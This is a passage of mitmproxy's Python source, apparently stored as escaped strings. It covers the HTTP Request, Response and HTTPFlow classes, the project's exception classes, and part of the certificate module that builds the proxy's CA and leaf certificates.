self._update_host_and_authority()\n\n    def _update_host_and_authority(self) -> None:\n        val = url.hostport(self.scheme, self.host, self.port)\n\n        # Update host header\n        if \"Host\" in self.data.headers:\n            self.data.headers[\"Host\"] = val\n        # Update authority\n        if self.data.authority:\n            self.authority = val\n\n    @property\n    def path(self) -> str:\n        \"\"\"\n        HTTP request path, e.g. \"/index.html\" or \"/index.html?a=b\".\n        Usually starts with a slash, except for OPTIONS requests, which may just be \"*\".\n\n        This attribute includes both path and query parts of the target URI\n        (see Sections 3.3 and 3.4 of [RFC3986](https://datatracker.ietf.org/doc/html/rfc3986)).\n        \"\"\"\n        return self.data.path.decode(\"utf-8\", \"surrogateescape\")\n\n    @path.setter\n    def path(self, val: str | bytes) -> None:\n        self.data.path = always_bytes(val, \"utf-8\", \"surrogateescape\")\n\n    @property\n    def url(self) -> str:\n        \"\"\"\n        The full URL string, constructed from `Request.scheme`, `Request.host`, `Request.port` and `Request.path`.\n\n        Settings this property updates these attributes as well.\n        \"\"\"\n        if self.first_line_format == \"authority\":\n            return f\"{self.host}:{self.port}\"\n        return url.unparse(self.scheme, self.host, self.port, self.path)\n\n    @url.setter\n    def url(self, val: str | bytes) -> None:\n        val = always_str(val, \"utf-8\", \"surrogateescape\")\n        self.scheme, self.host, self.port, self.path = url.parse(val)\n\n    @property\n    def pretty_host(self) -> str:\n        \"\"\"\n        *Read-only:* Like `Request.host`, but using `Request.host_header` header as an additional (preferred) data source.\n        This is useful in transparent mode where `Request.host` is only an IP address.\n\n        *Warning:* When working in adversarial environments, this may not reflect the actual destination\n        as the Host header could be spoofed.\n        \"\"\"\n        authority = self.host_header\n        if authority:\n            return url.parse_authority(authority, check=False)[0]\n        else:\n            return self.host\n\n    @property\n    def pretty_url(self) -> str:\n        \"\"\"\n        *Read-only:* Like `Request.url`, but using `Request.pretty_host` instead of `Request.host`.\n        \"\"\"\n        if self.first_line_format == \"authority\":\n            return self.authority\n\n        host_header = self.host_header\n        if not host_header:\n            return self.url\n\n        pretty_host, pretty_port = url.parse_authority(host_header, check=False)\n        pretty_port = pretty_port or url.default_port(self.scheme) or 443\n\n        return url.unparse(self.scheme, pretty_host, pretty_port, self.path)\n\n    def _get_query(self):\n        query = urllib.parse.urlparse(self.url).query\n        return tuple(url.decode(query))\n\n    def _set_query(self, query_data):\n        query = url.encode(query_data)\n        _, _, path, params, _, fragment = urllib.parse.urlparse(self.url)\n        self.path = urllib.parse.urlunparse([\"\", \"\", path, params, query, fragment])\n\n    @property\n    def query(self) -> multidict.MultiDictView[str, str]:\n        \"\"\"\n        The request query as a mutable mapping view on the request's path.\n        For the most part, this behaves like a dictionary.\n        Modifications to the MultiDictView update `Request.path`, and vice versa.\n        \"\"\"\n        return multidict.MultiDictView(self._get_query, self._set_query)\n\n    @query.setter\n    def query(self, value):\n        self._set_query(value)\n\n    def _get_cookies(self):\n        h = self.headers.get_all(\"Cookie\")\n        return tuple(cookies.parse_cookie_headers(h))\n\n    def _set_cookies(self, value):\n        self.headers[\"cookie\"] = cookies.format_cookie_header(value)\n\n    @property\n    def cookies(self) -> multidict.MultiDictView[str, str]:\n        \"\"\"\n        The request cookies.\n        For the most part, this behaves like a dictionary.\n        Modifications to the MultiDictView update `Request.headers`, and vice versa.\n        \"\"\"\n        return multidict.MultiDictView(self._get_cookies, self._set_cookies)\n\n    @cookies.setter\n    def cookies(self, value):\n        self._set_cookies(value)\n\n    @property\n    def path_components(self) -> tuple[str, ...]:\n        \"\"\"\n        The URL's path components as a tuple of strings.\n        Components are unquoted.\n        \"\"\"\n        path = urllib.parse.urlparse(self.url).path\n        # This needs to be a tuple so that it's immutable.\n        # Otherwise, this would fail silently:\n        #   request.path_components.append(\"foo\")\n        return tuple(url.unquote(i) for i in path.split(\"/\") if i)\n\n    @path_components.setter\n    def path_components(self, components: Iterable[str]):\n        components = map(lambda x: url.quote(x, safe=\"\"), components)\n        path = \"/\" + \"/\".join(components)\n        _, _, _, params, query, fragment = urllib.parse.urlparse(self.url)\n        self.path = urllib.parse.urlunparse([\"\", \"\", path, params, query, fragment])\n\n    def anticache(self) -> None:\n        \"\"\"\n        Modifies this request to remove headers that might produce a cached response.\n        \"\"\"\n        delheaders = (\n            \"if-modified-since\",\n            \"if-none-match\",\n        )\n        for i in delheaders:\n            self.headers.pop(i, None)\n\n    def anticomp(self) -> None:\n        \"\"\"\n        Modify the Accept-Encoding header to only accept uncompressed responses.\n        \"\"\"\n        self.headers[\"accept-encoding\"] = \"identity\"\n\n    def constrain_encoding(self) -> None:\n        \"\"\"\n        Limits the permissible Accept-Encoding values, based on what we can decode appropriately.\n        \"\"\"\n        accept_encoding = self.headers.get(\"accept-encoding\")\n        if accept_encoding:\n            self.headers[\"accept-encoding\"] = \", \".join(\n                e\n                for e in {\"gzip\", \"identity\", \"deflate\", \"br\", \"zstd\"}\n                if e in accept_encoding\n            )\n\n    def _get_urlencoded_form(self):\n        is_valid_content_type = (\n            \"application/x-www-form-urlencoded\"\n            in self.headers.get(\"content-type\", \"\").lower()\n        )\n        if is_valid_content_type:\n            return tuple(url.decode(self.get_text(strict=False)))\n        return ()\n\n    def _set_urlencoded_form(self, form_data: Sequence[tuple[str, str]]) -> None:\n        \"\"\"\n        Sets the body to the URL-encoded form data, and adds the appropriate content-type header.\n        This will overwrite the existing content if there is one.\n        \"\"\"\n        self.headers[\"content-type\"] = \"application/x-www-form-urlencoded\"\n        self.content = url.encode(form_data, self.get_text(strict=False)).encode()\n\n    @property\n    def urlencoded_form(self) -> multidict.MultiDictView[str, str]:\n        \"\"\"\n        The URL-encoded form data.\n\n        If the content-type indicates non-form data or the form could not be parsed, this is set to\n        an empty `MultiDictView`.\n\n        Modifications to the MultiDictView update `Request.content`, and vice versa.\n        \"\"\"\n        return multidict.MultiDictView(\n            self._get_urlencoded_form, self._set_urlencoded_form\n        )\n\n    @urlencoded_form.setter\n    def urlencoded_form(self, value):\n        self._set_urlencoded_form(value)\n\n    def _get_multipart_form(self) -> list[tuple[bytes, bytes]]:\n        is_valid_content_type = (\n            \"multipart/form-data\" in self.headers.get(\"content-type\", \"\").lower()\n        )\n        if is_valid_content_type and self.content is not None:\n            try:\n                return multipart.decode_multipart(\n                    self.headers.get(\"content-type\"), self.content\n                )\n            except ValueError:\n                pass\n        return []\n\n    def _set_multipart_form(self, value: list[tuple[bytes, bytes]]) -> None:\n        ct = self.headers.get(\"content-type\", \"\")\n        is_valid_content_type = ct.lower().startswith(\"multipart/form-data\")\n        if not is_valid_content_type:\n            \"\"\"\n            Generate a random boundary here.\n\n            See <https://datatracker.ietf.org/doc/html/rfc2046#section-5.1.1> for specifications\n            on generating the boundary.\n            \"\"\"\n            boundary = \"-\" * 20 + binascii.hexlify(os.urandom(16)).decode()\n            self.headers[\"content-type\"] = ct = (\n                f\"multipart/form-data; boundary={boundary}\"\n            )\n        self.content = multipart.encode_multipart(ct, value)\n\n    @property\n    def multipart_form(self) -> multidict.MultiDictView[bytes, bytes]:\n        \"\"\"\n        The multipart form data.\n\n        If the content-type indicates non-form data or the form could not be parsed, this is set to\n        an empty `MultiDictView`.\n\n        Modifications to the MultiDictView update `Request.content`, and vice versa.\n        \"\"\"\n        return multidict.MultiDictView(\n            self._get_multipart_form, self._set_multipart_form\n        )\n\n    @multipart_form.setter\n    def multipart_form(self, value: list[tuple[bytes, bytes]]) -> None:\n        self._set_multipart_form(value)\n\n\nclass Response(Message):\n    \"\"\"\n    An HTTP response.\n    \"\"\"\n\n    data: ResponseData\n\n    def __init__(\n        self,\n        http_version: bytes,\n        status_code: int,\n        reason: bytes,\n        headers: Headers | tuple[tuple[bytes, bytes], ...],\n        content: bytes | None,\n        trailers: None | Headers | tuple[tuple[bytes, bytes], ...],\n        timestamp_start: float,\n        timestamp_end: float | None,\n    ):\n        # auto-convert invalid types to retain compatibility with older code.\n        if isinstance(http_version, str):\n            http_version = http_version.encode(\"ascii\", \"strict\")\n        if isinstance(reason, str):\n            reason = reason.encode(\"ascii\", \"strict\")\n\n        if isinstance(content, str):\n            raise ValueError(f\"Content must be bytes, not {type(content).__name__}\")\n        if not isinstance(headers, Headers):\n            headers = Headers(headers)\n        if trailers is not None and not isinstance(trailers, Headers):\n            trailers = Headers(trailers)\n\n        self.data = ResponseData(\n            http_version=http_version,\n            status_code=status_code,\n            reason=reason,\n            headers=headers,\n            content=content,\n            trailers=trailers,\n            timestamp_start=timestamp_start,\n            timestamp_end=timestamp_end,\n        )\n\n    def __repr__(self) -> str:\n        if self.raw_content:\n            ct = self.headers.get(\"content-type\", \"unknown content type\")\n            size = human.pretty_size(len(self.raw_content))\n            details = f\"{ct}, {size}\"\n        else:\n            details = \"no content\"\n        return f\"Response({self.status_code}, {details})\"\n\n    @classmethod\n    def make(\n        cls,\n        status_code: int = 200,\n        content: bytes | str = b\"\",\n        headers: (\n            Headers | Mapping[str, str | bytes] | Iterable[tuple[bytes, bytes]]\n        ) = (),\n    ) -> \"Response\":\n        \"\"\"\n        Simplified API for creating response objects.\n        \"\"\"\n        if isinstance(headers, Headers):\n            headers = headers\n        elif isinstance(headers, dict):\n            headers = Headers(\n                (\n                    always_bytes(k, \"utf-8\", \"surrogateescape\"),  # type: ignore\n                    always_bytes(v, \"utf-8\", \"surrogateescape\"),\n                )\n                for k, v in headers.items()\n            )\n        elif isinstance(headers, Iterable):\n            headers = Headers(headers)  # type: ignore\n        else:\n            raise TypeError(\n                \"Expected headers to be an iterable or dict, but is {}.\".format(\n                    type(headers).__name__\n                )\n            )\n\n        resp = cls(\n            b\"HTTP/1.1\",\n            status_code,\n            status_codes.RESPONSES.get(status_code, \"\").encode(),\n            headers,\n            None,\n            None,\n            time.time(),\n            time.time(),\n        )\n\n        # Assign this manually to update the content-length header.\n        if isinstance(content, bytes):\n            resp.content = content\n        elif isinstance(content, str):\n            resp.text = content\n        else:\n            raise TypeError(\n                f\"Expected content to be str or bytes, but is {type(content).__name__}.\"\n            )\n\n        return resp\n\n    @property\n    def status_code(self) -> int:\n        \"\"\"\n        HTTP Status Code, e.g. ``200``.\n        \"\"\"\n        return self.data.status_code\n\n    @status_code.setter\n    def status_code(self, status_code: int) -> None:\n        self.data.status_code = status_code\n\n    @property\n    def reason(self) -> str:\n        \"\"\"\n        HTTP reason phrase, for example \"Not Found\".\n\n        HTTP/2 responses do not contain a reason phrase, an empty string will be returned instead.\n        \"\"\"\n        # Encoding: http://stackoverflow.com/a/16674906/934719\n        return self.data.reason.decode(\"ISO-8859-1\")\n\n    @reason.setter\n    def reason(self, reason: str | bytes) -> None:\n        self.data.reason = strutils.always_bytes(reason, \"ISO-8859-1\")\n\n    def _get_cookies(self):\n        h = self.headers.get_all(\"set-cookie\")\n        all_cookies = cookies.parse_set_cookie_headers(h)\n        return tuple((name, (value, attrs)) for name, value, attrs in all_cookies)\n\n    def _set_cookies(self, value):\n        cookie_headers = []\n        for k, v in value:\n            header = cookies.format_set_cookie_header([(k, v[0], v[1])])\n            cookie_headers.append(header)\n        self.headers.set_all(\"set-cookie\", cookie_headers)\n\n    @property\n    def cookies(\n        self,\n    ) -> multidict.MultiDictView[str, tuple[str, multidict.MultiDict[str, str | None]]]:\n        \"\"\"\n        The response cookies. A possibly empty `MultiDictView`, where the keys are cookie\n        name strings, and values are `(cookie value, attributes)` tuples. Within\n        attributes, unary attributes (e.g. `HTTPOnly`) are indicated by a `None` value.\n        Modifications to the MultiDictView update `Response.headers`, and vice versa.\n\n        *Warning:* Changes to `attributes` will not be picked up unless you also reassign\n        the `(cookie value, attributes)` tuple directly in the `MultiDictView`.\n        \"\"\"\n        return multidict.MultiDictView(self._get_cookies, self._set_cookies)\n\n    @cookies.setter\n    def cookies(self, value):\n        self._set_cookies(value)\n\n    def refresh(self, now=None):\n        \"\"\"\n        This fairly complex and heuristic function refreshes a server\n        response for replay.\n\n         - It adjusts date, expires, and last-modified headers.\n         - It adjusts cookie expiration.\n        \"\"\"\n        if not now:\n            now = time.time()\n        delta = now - self.timestamp_start\n        refresh_headers = [\n            \"date\",\n            \"expires\",\n            \"last-modified\",\n        ]\n        for i in refresh_headers:\n            if i in self.headers:\n                d = parsedate_tz(self.headers[i])\n                if d:\n                    new = mktime_tz(d) + delta\n                    try:\n                        self.headers[i] = formatdate(new, usegmt=True)\n                    except OSError:  # pragma: no cover\n                        pass  # value out of bounds on Windows only (which is why we exclude it from coverage).\n        c = []\n        for set_cookie_header in self.headers.get_all(\"set-cookie\"):\n            try:\n                refreshed = cookies.refresh_set_cookie_header(set_cookie_header, delta)\n            except ValueError:\n                refreshed = set_cookie_header\n            c.append(refreshed)\n        if c:\n            self.headers.set_all(\"set-cookie\", c)\n\n\nclass HTTPFlow(flow.Flow):\n    \"\"\"\n    An HTTPFlow is a collection of objects representing a single HTTP\n    transaction.\n    \"\"\"\n\n    request: Request\n    \"\"\"The client's HTTP request.\"\"\"\n    response: Response | None = None\n    \"\"\"The server's HTTP response.\"\"\"\n    error: flow.Error | None = None\n    \"\"\"\n    A connection or protocol error affecting this flow.\n\n    Note that it's possible for a Flow to have both a response and an error\n    object. This might happen, for instance, when a response was received\n    from the server, but there was an error sending it back to the client.\n    \"\"\"\n\n    websocket: WebSocketData | None = None\n    \"\"\"\n    If this HTTP flow initiated a WebSocket connection, this attribute contains all associated WebSocket data.\n    \"\"\"\n\n    def get_state(self) -> serializable.State:\n        return {\n            **super().get_state(),\n            \"request\": self.request.get_state(),\n            \"response\": self.response.get_state() if self.response else None,\n            \"websocket\": self.websocket.get_state() if self.websocket else None,\n        }\n\n    def set_state(self, state: serializable.State) -> None:\n        self.request = Request.from_state(state.pop(\"request\"))\n        self.response = Response.from_state(r) if (r := state.pop(\"response\")) else None\n        self.websocket = (\n            WebSocketData.from_state(w) if (w := state.pop(\"websocket\")) else None\n        )\n        super().set_state(state)\n\n    def __repr__(self):\n        s = \"<HTTPFlow\"\n        for a in (\n            \"request\",\n            \"response\",\n            \"websocket\",\n            \"error\",\n            \"client_conn\",\n            \"server_conn\",\n        ):\n            if getattr(self, a, False):\n                s += f\"\\r\\n  {a} = {{flow.{a}}}\"\n        s += \">\"\n        return s.format(flow=self)\n\n    @property\n    def timestamp_start(self) -> float:\n        \"\"\"*Read-only:* An alias for `Request.timestamp_start`.\"\"\"\n        return self.request.timestamp_start\n\n    @property\n    def mode(self) -> str:  # pragma: no cover\n        warnings.warn(\"HTTPFlow.mode is deprecated.\", DeprecationWarning, stacklevel=2)\n        return getattr(self, \"_mode\", \"regular\")\n\n    @mode.setter\n    def mode(self, val: str) -> None:  # pragma: no cover\n        warnings.warn(\"HTTPFlow.mode is deprecated.\", DeprecationWarning, stacklevel=2)\n        self._mode = val\n\n    def copy(self):\n        f = super().copy()\n        if self.request:\n            f.request = self.request.copy()\n        if self.response:\n            f.response = self.response.copy()\n        return f\n\n\n__all__ = [\n    \"HTTPFlow\",\n    \"Message\",\n    \"Request\",\n    \"Response\",\n    \"Headers\",\n]\n", "mitmproxy/exceptions.py": "\"\"\"\n\nEdit 2020-12 @mhils:\n    The advice below hasn't paid off in any form. We now just use builtin exceptions and specialize where necessary.\n\n---\n\nWe try to be very hygienic regarding the exceptions we throw:\n\n- Every exception that might be externally visible to users shall be a subclass\n  of MitmproxyException.p\n- Every exception in the base net module shall be a subclass\n  of NetlibException, and will not be propagated directly to users.\n\nSee also: http://lucumr.pocoo.org/2014/10/16/on-error-handling/\n\"\"\"\n\n\nclass MitmproxyException(Exception):\n    \"\"\"\n    Base class for all exceptions thrown by mitmproxy.\n    \"\"\"\n\n    def __init__(self, message=None):\n        super().__init__(message)\n\n\nclass FlowReadException(MitmproxyException):\n    pass\n\n\nclass ControlException(MitmproxyException):\n    pass\n\n\nclass CommandError(Exception):\n    pass\n\n\nclass OptionsError(MitmproxyException):\n    pass\n\n\nclass AddonManagerError(MitmproxyException):\n    pass\n\n\nclass AddonHalt(MitmproxyException):\n    \"\"\"\n    Raised by addons to signal that no further handlers should handle this event.\n    \"\"\"\n", "mitmproxy/certs.py": "import contextlib\nimport datetime\nimport ipaddress\nimport os\nimport sys\nimport warnings\nfrom collections.abc import Iterable\nfrom dataclasses import dataclass\nfrom pathlib import Path\nfrom typing import cast\nfrom typing import NewType\nfrom typing import Optional\nfrom typing import Union\n\nimport OpenSSL\nfrom cryptography import x509\nfrom cryptography.hazmat.primitives import hashes\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.hazmat.primitives.asymmetric import dsa\nfrom cryptography.hazmat.primitives.asymmetric import ec\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.primitives.serialization import pkcs12\nfrom cryptography.x509 import ExtendedKeyUsageOID\nfrom cryptography.x509 import NameOID\n\nfrom mitmproxy.coretypes import serializable\n\n# Default expiry must not be too long: https://github.com/mitmproxy/mitmproxy/issues/815\nCA_EXPIRY = datetime.timedelta(days=10 * 365)\nCERT_EXPIRY = datetime.timedelta(days=365)\n\n# Generated with \"openssl dhparam\". It's too slow to generate this on startup.\nDEFAULT_DHPARAM = b\"\"\"\n-----BEGIN DH PARAMETERS-----\nMIICCAKCAgEAyT6LzpwVFS3gryIo29J5icvgxCnCebcdSe/NHMkD8dKJf8suFCg3\nO2+dguLakSVif/t6dhImxInJk230HmfC8q93hdcg/j8rLGJYDKu3ik6H//BAHKIv\nj5O9yjU3rXCfmVJQic2Nne39sg3CreAepEts2TvYHhVv3TEAzEqCtOuTjgDv0ntJ\nGwpj+BJBRQGG9NvprX1YGJ7WOFBP/hWU7d6tgvE6Xa7T/u9QIKpYHMIkcN/l3ZFB\nchZEqVlyrcngtSXCROTPcDOQ6Q8QzhaBJS+Z6rcsd7X+haiQqvoFcmaJ08Ks6LQC\nZIL2EtYJw8V8z7C0igVEBIADZBI6OTbuuhDwRw//zU1uq52Oc48CIZlGxTYG/Evq\no9EWAXUYVzWkDSTeBH1r4z/qLPE2cnhtMxbFxuvK53jGB0emy2y1Ei6IhKshJ5qX\nIB/aE7SSHyQ3MDHHkCmQJCsOd4Mo26YX61NZ+n501XjqpCBQ2+DfZCBh8Va2wDyv\nA2Ryg9SUz8j0AXViRNMJgJrr446yro/FuJZwnQcO3WQnXeqSBnURqKjmqkeFP+d8\n6mk2tqJaY507lRNqtGlLnj7f5RNoBFJDCLBNurVgfvq9TCVWKDIFD4vZRjCrnl6I\nrD693XKIHUCWOjMh1if6omGXKHH40QuME2gNa50+YPn1iYDl88uDbbMCAQI=\n-----END DH PARAMETERS-----\n\"\"\"\n\n\nclass Cert(serializable.Serializable):\n    \"\"\"Representation of a (TLS) certificate.\"\"\"\n\n    _cert: x509.Certificate\n\n    def __init__(self, cert: x509.Certificate):\n        assert isinstance(cert, x509.Certificate)\n        self._cert = cert\n\n    def __eq__(self, other):\n        return self.fingerprint() == other.fingerprint()\n\n    def __repr__(self):\n        altnames = [str(x.value) for x in self.altnames]\n        return f\"<Cert(cn={self.cn!r}, altnames={altnames!r})>\"\n\n    def __hash__(self):\n        return self._cert.__hash__()\n\n    @classmethod\n    def from_state(cls, state):\n        return cls.from_pem(state)\n\n    def get_state(self):\n        return self.to_pem()\n\n    def set_state(self, state):\n        self._cert = x509.load_pem_x509_certificate(state)\n\n    @classmethod\n    def from_pem(cls, data: bytes) -> \"Cert\":\n        cert = x509.load_pem_x509_certificate(data)  # type: ignore\n        return cls(cert)\n\n    def to_pem(self) -> bytes:\n        return self._cert.public_bytes(serialization.Encoding.PEM)\n\n    @classmethod\n    def from_pyopenssl(self, x509: OpenSSL.crypto.X509) -> \"Cert\":\n        return Cert(x509.to_cryptography())\n\n    def to_pyopenssl(self) -> OpenSSL.crypto.X509:\n        return OpenSSL.crypto.X509.from_cryptography(self._cert)\n\n    def fingerprint(self) -> bytes:\n        return self._cert.fingerprint(hashes.SHA256())\n\n    @property\n    def issuer(self) -> list[tuple[str, str]]:\n        return _name_to_keyval(self._cert.issuer)\n\n    @property\n    def notbefore(self) -> datetime.datetime:\n        try:\n            # type definitions haven't caught up with new API yet.\n            return self._cert.not_valid_before_utc  # type: ignore\n        except AttributeError:  # pragma: no cover\n            # cryptography < 42.0\n            return self._cert.not_valid_before.replace(tzinfo=datetime.timezone.utc)\n\n    @property\n    def notafter(self) -> datetime.datetime:\n        try:\n            return self._cert.not_valid_after_utc  # type: ignore\n        except AttributeError:  # pragma: no cover\n            return self._cert.not_valid_after.replace(tzinfo=datetime.timezone.utc)\n\n    def has_expired(self) -> bool:\n        if sys.version_info < (3, 11):  # pragma: no cover\n            return datetime.datetime.now(datetime.timezone.utc) > self.notafter\n        return datetime.datetime.now(datetime.UTC) > self.notafter\n\n    @property\n    def subject(self) -> list[tuple[str, str]]:\n        return _name_to_keyval(self._cert.subject)\n\n    @property\n    def serial(self) -> int:\n        return self._cert.serial_number\n\n    @property\n    def keyinfo(self) -> tuple[str, int]:\n        public_key = self._cert.public_key()\n        if isinstance(public_key, rsa.RSAPublicKey):\n            return \"RSA\", public_key.key_size\n        if isinstance(public_key, dsa.DSAPublicKey):\n            return \"DSA\", public_key.key_size\n        if isinstance(public_key, ec.EllipticCurvePublicKey):\n            return f\"EC ({public_key.curve.name})\", public_key.key_size\n        return (\n            public_key.__class__.__name__.replace(\"PublicKey\", \"\").replace(\"_\", \"\"),\n            getattr(public_key, \"key_size\", -1),\n        )  # pragma: no cover\n\n    @property\n    def cn(self) -> str | None:\n        attrs = self._cert.subject.get_attributes_for_oid(x509.NameOID.COMMON_NAME)\n        if attrs:\n            return cast(str, attrs[0].value)\n        return None\n\n    @property\n    def organization(self) -> str | None:\n        attrs = self._cert.subject.get_attributes_for_oid(\n            x509.NameOID.ORGANIZATION_NAME\n        )\n        if attrs:\n            return cast(str, attrs[0].value)\n        return None\n\n    @property\n    def altnames(self) -> x509.GeneralNames:\n        \"\"\"\n        Get all SubjectAlternativeName DNS altnames.\n        \"\"\"\n        try:\n            sans = self._cert.extensions.get_extension_for_class(\n                x509.SubjectAlternativeName\n            ).value\n        except x509.ExtensionNotFound:\n            return x509.GeneralNames([])\n        else:\n            return x509.GeneralNames(sans)\n\n\ndef _name_to_keyval(name: x509.Name) -> list[tuple[str, str]]:\n    parts = []\n    for attr in name:\n        k = attr.rfc4514_string().partition(\"=\")[0]\n        v = cast(str, attr.value)\n        parts.append((k, v))\n    return parts\n\n\ndef create_ca(\n    organization: str,\n    cn: str,\n    key_size: int,\n) -> tuple[rsa.RSAPrivateKeyWithSerialization, x509.Certificate]:\n    now = datetime.datetime.now()\n\n    private_key = rsa.generate_private_key(\n        public_exponent=65537,\n        key_size=key_size,\n    )  # type: ignore\n    name = x509.Name(\n        [\n            x509.NameAttribute(NameOID.COMMON_NAME, cn),\n            x509.NameAttribute(NameOID.ORGANIZATION_NAME, organization),\n        ]\n    )\n    builder = x509.CertificateBuilder()\n    builder = builder.serial_number(x509.random_serial_number())\n    builder = builder.subject_name(name)\n    builder = builder.not_valid_before(now - datetime.timedelta(days=2))\n    builder = builder.not_valid_after(now + CA_EXPIRY)\n    builder = builder.issuer_name(name)\n    builder = builder.public_key(private_key.public_key())\n    builder = builder.add_extension(\n        x509.BasicConstraints(ca=True, path_length=None), critical=True\n    )\n    builder = builder.add_extension(\n        x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]), critical=False\n    )\n    builder = builder.add_extension(\n        x509.KeyUsage(\n            digital_signature=False,\n            content_commitment=False,\n            key_encipherment=False,\n            data_encipherment=False,\n            key_agreement=False,\n            key_cert_sign=True,\n            crl_sign=True,\n            encipher_only=False,\n            decipher_only=False,\n        ),\n        critical=True,\n    )\n    builder = builder.add_extension(\n        x509.SubjectKeyIdentifier.from_public_key(private_key.public_key()),\n        critical=False,\n    )\n    cert = builder.sign(private_key=private_key, algorithm=hashes.SHA256())  # type: ignore\n    return private_key, cert\n\n\ndef _fix_legacy_sans(sans: Iterable[x509.GeneralName] | list[str]) -> x509.GeneralNames:\n    \"\"\"\n    SANs used to be a list of strings in mitmproxy 10.1 and below, but now they're a list of GeneralNames.\n    This function converts the old format to the new one.\n    \"\"\"\n    if isinstance(sans, x509.GeneralNames):\n        return sans\n    elif (\n        isinstance(sans, list) and len(sans) > 0 and isinstance(sans[0], str)\n    ):  # pragma: no cover\n        warnings.warn(\n            \"Passing SANs as a list of strings is deprecated.\",\n            DeprecationWarning,\n            stacklevel=2,\n        )\n\n        ss: list[x509.GeneralName] = []\n        for x in cast(list[str], sans):\n            try:\n                ip = ipaddress.ip_address(x)\n            except ValueError:\n                x = x.encode(\"idna\").decode()\n                ss.append(x509.DNSName(x))\n            else:\n                ss.append(x509.IPAddress(ip))\n        return x509.GeneralNames(ss)\n    else:\n        return x509.GeneralNames(sans)\n\n\ndef dummy_cert(\n    privkey: rsa.RSAPrivateKey,\n    cacert: x509.Certificate,\n    commonname: str | None,\n    sans: Iterable[x509.GeneralName],\n    organization: str | None = None,\n) -> Cert:\n    \"\"\"\n    Generates a dummy certificate.\n\n    privkey: CA private key\n    cacert: CA certificate\n    commonname: Common name for the generated certificate.\n    sans: A list of Subject Alternate Names.\n    organization: Organization name for the generated certificate.\n\n    Returns cert if operation succeeded, None if not.\n    \"\"\"\n    builder = x509.CertificateBuilder()\n    builder = builder.issuer_name(cacert.subject)\n    builder = builder.add_extension(\n        x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]), critical=False\n    )\n    builder = builder.public_key(cacert.public_key())\n\n    now = datetime.datetime.now()\n    builder = builder.not_valid_before(now - datetime.timedelta(days=2))\n    builder = builder.not_valid_after(now + CERT_EXPIRY)\n\n    subject = []\n    is_valid_commonname = commonname is not None and len(commonname) < 64\n    if is_valid_commonname:\n        assert commonname is not None\n        subject.append(x509.NameAttribute(NameOID.COMMON_NAME, commonname))\n    if organization is not None:\n        assert organization is not None\n        subject.append(x509.NameAttribute(NameOID.ORGANIZATION_NAME, organization))\n    builder = builder.subject_name(x509.Name(subject))\n    builder = builder.serial_number(x509.random_serial_number())\n\n    # RFC 5280 \u00a74.2.1.6: subjectAltName is critical if subject is empty.\n    builder = builder.add_extension(\n        x509.SubjectAlternativeName(_fix_legacy_sans(sans)),\n        critical=not is_valid_commonname,\n    )\n\n    # https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.1.1\n    builder = builder.add_extension(\n        x509.AuthorityKeyIdentifier.from_issuer_public_key(cacert.public_key()),\n        critical=False,\n    )\n    # If CA and leaf cert have the same Subject Key Identifier, SChannel breaks in funny ways,\n    # see https://github.com/mitmproxy/mitmproxy/issues/6494.\n    # https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.1.2 states\n    # that SKI is optional for the leaf cert, so we skip that.\n\n    cert = builder.sign(private_key=privkey, algorithm=hashes.SHA256())  # type: ignore\n    return Cert(cert)\n\n\n@dataclass(frozen=True)\nclass CertStoreEntry:\n    cert: Cert\n    privatekey: rsa.RSAPrivateKey\n    chain_file: Path | None\n    chain_certs: list[Cert]\n\n\nTCustomCertId = str  # manually provided certs (e.g. mitmproxy's --certs)\nTGeneratedCertId = tuple[Optional[str], x509.GeneralNames]  # (common_name, sans)\nTCertId = Union[TCustomCertId, TGeneratedCertId]\n\nDHParams = NewType(\"DHParams\", bytes)\n\n\nclass CertStore:\n    \"\"\"\n    Implements an in-memory certificate store.\n    \"\"\"\n\n    STORE_CAP = 100\n    certs: dict[TCertId, CertStoreEntry]\n    expire_queue: list[CertStoreEntry]\n\n    def __init__(\n        self,\n        default_privatekey: rsa.RSAPrivateKey,\n        default_ca: Cert,\n        default_chain_file: Path | None,\n        dhparams: DHParams,\n    ):\n        self.default_privatekey = default_privatekey\n        self.default_ca = default_ca\n        self.default_chain_file = default_chain_file\n        self.default_chain_certs = (\n            x509.load_pem_x509_certificates(self.default_chain_file.read_bytes())\n            if self.default_chain_file\n            else [default_ca]\n        )\n        self.dhparams = dhparams\n        self.certs = {}\n        self.expire_queue = []\n\n    def expire(self, entry: CertStoreEntry) -> None:\n        self.expire_queue.append(entry)\n        if len(self.expire_queue) > self.STORE_CAP:\n            d = self.expire_queue.pop(0)\n            self.certs = {k: v for k, v in self.certs.items() if v != d}\n\n    @staticmethod\n    def load_dhparam(path: Path) -> DHParams:\n        # mitmproxy<=0.10 doesn't generate a dhparam file.\n        # Create it now if necessary.\n        if not path.exists():\n            path.write_bytes(DEFAULT_DHPARAM)\n\n        # we could use cryptography for this, but it's unclear how to convert cryptography's object to pyOpenSSL's\n        # expected format.\n        bio = OpenSSL.SSL._lib.BIO_new_file(  # type: ignore\n            str(path).encode(sys.getfilesystemencoding()), b\"r\"\n        )\n        if bio != OpenSSL.SSL._ffi.NULL:  # type: ignore\n            bio = OpenSSL.SSL._ffi.gc(bio, OpenSSL.SSL._lib.BIO_free)  # type: ignore\n            dh = OpenSSL.SSL._lib.PEM_read_bio_DHparams(  # type: ignore\n                bio,\n                OpenSSL.SSL._ffi.NULL,  # type: ignore\n                OpenSSL.SSL._ffi.NULL,  # type: ignore\n                OpenSSL.SSL._ffi.NULL,  # type: ignore\n            )\n            dh = OpenSSL.SSL._ffi.gc(dh, OpenSSL.SSL._lib.DH_free)  # type: ignore\n            return dh\n        raise RuntimeError(\"Error loading DH Params.\")  # pragma: no cover\n\n    @classmethod\n    def from_store(\n        cls,\n        path: Path | str,\n        basename: str,\n        key_size: int,\n        passphrase: bytes | None = None,\n    ) -> \"CertStore\":\n        path = Path(path)\n        ca_file = path / f\"{basename}-ca.pem\"\n        dhparam_file = path / f\"{basename}-dhparam.pem\"\n        if not ca_file.exists():\n            cls.create_store(path, basename, key_size)\n        return cls.from_files(ca_file, dhparam_file, passphrase)\n\n    @classmethod\n    def from_files(\n        cls, ca_file: Path, dhparam_file: Path, passphrase: bytes | None = None\n    ) -> \"CertStore\":\n        